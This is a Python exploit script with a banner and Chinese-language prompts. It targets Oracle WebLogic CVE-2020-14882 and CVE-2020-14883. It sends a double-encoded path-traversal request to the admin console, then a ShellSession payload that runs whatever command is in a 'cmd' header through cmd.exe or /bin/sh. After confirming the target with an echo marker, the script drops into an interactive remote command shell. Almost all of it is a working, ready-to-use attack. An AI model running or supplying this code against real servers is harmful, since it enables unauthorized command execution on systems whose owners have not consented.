#!/usr/bin/env python
# coding:utf-8
import requests
import http.client

interface = """
▒█▀▀█ ▒█░░▒█ ▒█▀▀▀ ░░ █▀█ █▀▀█ █▀█ █▀▀█ ░░ ▄█░ ░█▀█░ ▄▀▀▄ ▄▀▀▄ █▀█ 
▒█░░░ ░▒█▒█░ ▒█▀▀▀ ▀▀ ░▄▀ █  █ ░▄▀ █  █ ▀▀ ░█░ █▄▄█▄ ▄▀▀▄ ▄▀▀▄ ░▄▀ 
▒█▄▄█ ░░▀▄▀░ ▒█▄▄▄ ░░ █▄▄ █▄▄█ █▄▄ █▄▄█ ░░ ▄█▄ ░░░█░ ▀▄▄▀ ▀▄▄▀ █▄▄              
                                                DESIGN BY N0Coriander
"""
print(interface)
http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

def weblogic_14882(path):
    payload_14882 = r"""/console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) '
                      'Version/5.0.4 Safari/533.20.27 '
    }
    try:
        # proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} #
        # 用于burp抓包，还需要在requests.get参数中加入proxies=proxies
        res_14882 = requests.get(path + payload_14882, headers=headers, timeout=(3, 7))
        res_14882.encoding = 'utf-8'
        return res_14882.status_code
    except Exception as e:
        print('【发生一个预期之外的错误，请检查你输入的域名格式，也可能是域名已经访问不到了】')

def weblogic_14883(path, cmd):
    payload_14883 = r"""/console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')"""
    headers = {
        'cmd': cmd,
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) '
                      'Version/5..04 Safari/533.20.27 '
    }
    # proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    res_14883 = requests.get(path + payload_14883, headers=headers, timeout=(3, 7))
    res_14883.encoding = 'utf-8'
    return res_14883.text


if __name__ == "__main__":
    while True:
        path = input("请输入被测站点的【域名】或【ip:port】形式(start with 'http//' or 'https://')>>>")
        if weblogic_14882(path) == 200:
            print(f'{path}【存在】CVE-2020-14882 未授权访问漏洞')
            # if ('html' in weblogic_14883(path, cmd='id')) or ('html' in weblogic_14883(path, cmd='whoami')) or ('html' in weblogic_14883(path, cmd='ls')):
            if ('4621d373cade4e83' not in weblogic_14883(path, cmd='echo "4621d373cade4e83"')):
                print('【不存在】CVE-2020-14883 命令执行漏洞')
                continue
            else:
                print(f'{path}【存在】CVE-2020-14883 命令执行漏洞')
                while True:
                    command = input('请输入你想执行的命令>>>')
                    print(weblogic_14883(path, cmd=command))
                    continue
        else:
            print('【不存在】CVE-2020-14882&14883 未授权访问及RCE漏洞')